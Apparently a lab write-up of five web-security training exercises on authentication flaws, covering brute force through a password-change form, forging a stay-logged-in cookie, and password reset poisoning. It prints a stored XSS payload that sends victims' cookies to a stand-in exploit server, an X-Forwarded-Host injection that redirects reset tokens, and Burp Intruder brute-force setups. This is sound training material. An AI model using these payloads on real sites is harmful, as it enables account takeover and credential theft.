**Other mechanisms include** -
**1. Reset password functionality** :- 

a) forgot password

b) change password

**2. Remember me functionality.**

**3. Lock out mechanism.**

**1st- Lab Write-Up: Password brute-force via password change**

**Step 1: Initial Setup**

Configure Burp Suite and ensure your browser is properly set up to route traffic through the proxy.

Access the lab and log in using the provided credentials.

**Step 2: Observing the Password Change Functionality**

Navigate to the "Change Password" feature on the application.

Note that the form requires three fields:

Current Password

New Password

Confirm New Password

Perform the following observations:

When you submit an incorrect Current Password with matching New Password and Confirm New Password, the account gets blocked after multiple attempts.

When you provide the correct Current Password but different values for New Password and Confirm New Password, the application throws an error message:
"New passwords don’t match."

**Step 3: Exploiting the Functionality**

Recognize that the error message for mismatched new passwords can help identify the correct Current Password.

Use Burp Suite to capture the POST request for changing the password:

Send the request to the Intruder tool.

Modify the username parameter to target the victim username carlos.

Set the current-password parameter as the payload position.

**Step 4: Configuring the Intruder Attack**

In Payloads, upload a wordlist of potential passwords for the current-password parameter.

In Grep – Match settings:

Add the string "New passwords don’t match" to identify successful guesses.

Start the attack.

**Step 5: Analyzing the Results**

Observe the responses in the attack results. Under the "New passwords don’t match" column, look for the payload that triggers this message.
Identify the correct password for carlos (in this case, 123456).

**Step 6: Logging In**

Use the identified password (123456) to log in as carlos.

Successfully solve the lab!

Key Takeaways

This attack leverages a logic flaw in the password change functionality, allowing brute force attempts without account lockout.

The error messages provide unintended feedback, aiding in identifying valid credentials.

Always validate and handle error messages securely to prevent information disclosure.

**2nd - Lab: Brute-forcing a stay-logged-in cookie**

Your credentials: wiener:peter

Victim's username: carlos

**1. Log in to your account**

Enable the "Stay logged in" option.

Notice that a stay-logged-in cookie is created.

**2.Inspect the cookie**

Use Burp's Inspector panel to view the cookie.

Decode it (Base64) and observe its format: username:md5HashOfPassword.

**3.Verify the hash**

Hash your password using MD5.

Check if the hash matches the second part of the decoded cookie.

Confirm that the cookie format is base64(username + ':' + md5HashOfPassword).

**4.Log out and send the request to Burp Intruder**

Log out of your account.

Find the most recent GET /my-account?id=wiener request in Burp.

Highlight the stay-logged-in cookie and send the request to Intruder.

**5.Set up Burp Intruder**

Ensure the stay-logged-in cookie is set as the payload position.

Add your own password as a payload (for testing).

Add these Payload Processing Rules:
Hash: MD5

Add Prefix: wiener:

Encode: Base64
![Screenshot from 2024-11-29 17-21-27](https://github.com/user-attachments/assets/21f087e9-4976-4697-8646-86e740e6555e)

**6.Add a response check**

In Intruder, add a grep match rule to flag responses containing the string Update email.

**7.Run the attack**

Start the attack and confirm that a valid payload allows access to your account.
![Screenshot from 2024-11-29 17-21-27](https://github.com/user-attachments/assets/bb0e007a-da43-403b-bcad-61a2a7a01152)

**8.Adjust for Carlos's account**

Replace your password with a list of candidate passwords.

Change the id parameter in the request URL from wiener to carlos.

Update the Add Prefix rule to use carlos: instead of wiener:.

**9.Run the attack again**

Start the attack.

Look for the response containing the Update email button.

The payload in this response is the valid stay-logged-in cookie for Carlos's account.

**Lab Solved**
![Screenshot from 2024-11-29 17-20-38](https://github.com/user-attachments/assets/69ee33c1-e01a-49f9-8611-5810db97b232)

Use the payload to access Carlos's account.

**3rd Lab**

**Lab: Offline password cracking**

Your credentials: wiener:peter

Victim's username: carlos

**1.Investigate the Stay logged in functionality**

Log in to your account with Burp running.

Notice that the stay-logged-in cookie is Base64 encoded.

Go to Proxy > HTTP history in Burp, find the response to your login request, and highlight the stay-logged-in cookie.

Observe that the cookie is constructed as:
username + ':' + md5HashOfPassword.

**2.Identify the XSS vulnerability**

Notice that the comment functionality on the blog is vulnerable to stored XSS.

**3.Get your exploit server URL**

Go to the exploit server and note down the exploit server URL.

**4.Post the XSS payload**

Go to one of the blog pages and post the following comment:


**"<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>"**

Replace YOUR-EXPLOIT-SERVER-ID with your actual exploit server ID.

**5.Capture the victim's cookie**

Open the access log on your exploit server.

Look for a GET request from the victim that includes their stay-logged-in cookie.

![Screenshot from 2024-11-29 17-53-18](https://github.com/user-attachments/assets/82e485ed-08a6-45b3-9fa6-5b846a3b3075)

**6.Decode the cookie**

Copy the victim's stay-logged-in cookie and decode it using Burp Decoder.

The decoded value will be in the format:
username:md5HashOfPassword

Example: carlos:26323c16d5f4dabff3bb136f2460a943.

**7.Find the victim's password**

Copy the MD5 hash (second part of the cookie) and search for it in a search engine.
The password for the hash should be revealed. Example: onceuponatime.

**8.Log in to the victim's account**

Use the victim's username (carlos) and the password you found to log in to their account.

**9.Delete the victim's account**

Go to the "My account" page in the victim's account.
Delete their account to solve the lab.
![Screenshot from 2024-11-29 17-52-24](https://github.com/user-attachments/assets/a8838cd5-1eac-4700-a566-50fff9842d55)

![Screenshot from 2024-11-29 17-52-53](https://github.com/user-attachments/assets/81ceb249-71a6-4bf4-a201-cf02175b1554)

**4th**

**Lab: Password reset poisoning via middleware**

**Given credentials: wiener:peter**

**1. Investigate the Password Reset Functionality**

Log in to the application and go to the password reset functionality (e.g., "Forgot your password?").

Request a password reset for your own account.

Observe that the application sends an email containing a password reset link with a unique token (temp-forgot-password-token).

**2. Send Request to Burp Repeater**

In Burp Proxy, locate the POST /forgot-password request in the HTTP history.

Right-click on the request and Send it to Repeater for further testing.

**3. Check for X-Forwarded-Host Header Support**

In Burp Repeater, add the X-Forwarded-Host header to the request.

"X-Forwarded-Host: test.com"

Send the request and observe if the password reset link in the email uses the value from the X-Forwarded-Host header.

Confirm that the application is vulnerable to manipulation of this header.

**4. Get Your Exploit Server URL**

Go to the exploit server and note down your unique URL (e.g., YOUR-EXPLOIT-SERVER-ID.exploit-server.net).

**5. Exploit the Vulnerability**

Go back to the POST /forgot-password request in Burp Repeater.

Add the following header:

"X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net"

Change the username parameter to carlos.

Send the request.

**6. Capture the Victim’s Reset Token**

Go to the exploit server and open the access log.

Look for a GET /forgot-password request made by the victim’s browser.

The query parameter temp-forgot-password-token in this request contains Carlos's reset token.

Make a note of the token.
![Screenshot from 2024-11-30 01-09-01](https://github.com/user-attachments/assets/2b5d2400-22d7-4c08-91e8-bf00a7509596)

**7. Use the Stolen Token**

Go back to your email client and copy the genuine password reset link (the one sent for your own account).

Open this link in a browser, but replace the value of temp-forgot-password-token with Carlos's token that you stole from the exploit server.

**8. Set a New Password**

On the password reset page, set a new password for Carlos's account.
![Screenshot from 2024-11-30 01-13-25](https://github.com/user-attachments/assets/25386b32-66a2-4b07-8a57-385a81605e81)

**9. Log in as Carlos**

Log in to Carlos’s account using the new password.
![Screenshot from 2024-11-30 01-10-16](https://github.com/user-attachments/assets/f6873959-9971-4062-92ca-691f1e90ac22)
The lab will be solved.

**5th Lab 
Lab: Password brute-force via password change**

Aim: To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.

Your credentials: wiener:peter
Victim's username: carlos

**1. Initial Exploration**

Start Burp Suite: Ensure Burp Suite is running and intercepting traffic.

Login to Your Account: Log in to your account on the web application.

Access Password Change Functionality: Navigate to the password change feature.

**2. Observations**

The username is submitted as a hidden input in the password change request.

Behavior Analysis:

Enter the wrong current password:

If the two new passwords match, the account is locked.

If the two new passwords do not match, an error message says: "Current password is incorrect."

Enter the correct current password:

If the two new passwords do not match, the error message says: "New passwords do not match."
![Screenshot from 2024-12-01 01-08-31](https://github.com/user-attachments/assets/820c498b-646a-4569-9624-395413a1ac1d)

These messages help differentiate between valid and invalid current passwords, allowing password enumeration.

**3. Preparing the Intruder Attack**

Intercept Request: Enter your correct current password and two mismatched new passwords, then intercept the POST /my-account/change-password request in Burp Suite.

Send to Intruder: Right-click the intercepted request and choose "Send to Intruder".

**4. Configuring the Intruder Attack**

Set Positions:

Change the username parameter to carlos.

Highlight the current-password parameter and set it as a payload position using §.

Set Static Values: Ensure the new-password-1 and new-password-2 parameters have different static values, such as:

![Screenshot from 2024-12-01 01-08-13](https://github.com/user-attachments/assets/be4ec82a-fefd-45e5-9e96-21fc368b2189)

username=carlos&current-password=§incorrect-password§&new-password-1=abc&new-password-2=abcd

**5. Payload Configuration**

Payload Set: Add a list of possible passwords to the Payloads tab in Burp Suite.

**6. Grep Match Rule**

Open the Settings side panel.

Add a grep match rule for responses containing the phrase:

New passwords do not match

**7. Launching the Attack**

Start the Attack: Run the Intruder attack.

Analyze Results: Identify the response containing the "New passwords do not match" message.

Make a note of the password in this response.

![Screenshot from 2024-12-01 01-08-13](https://github.com/user-attachments/assets/e436a2db-bbfa-4c01-9608-f86c5493c78f)

**8. Using the Identified Password**

Log Out: Log out of your own account.

Login as Carlos: Use the username carlos and the identified password to log in.

Access My Account: Navigate to the My Account page to solve the lab.
![Screenshot from 2024-12-01 01-07-53](https://github.com/user-attachments/assets/436787b0-79e8-4b2e-9201-d34e2e2ea987)

**Key Notes**

Error Messages as Indicators: Carefully observe error messages to identify patterns that aid in enumeration.

Payload Management: Use relevant wordlists for the payload set to improve the efficiency of attacks.
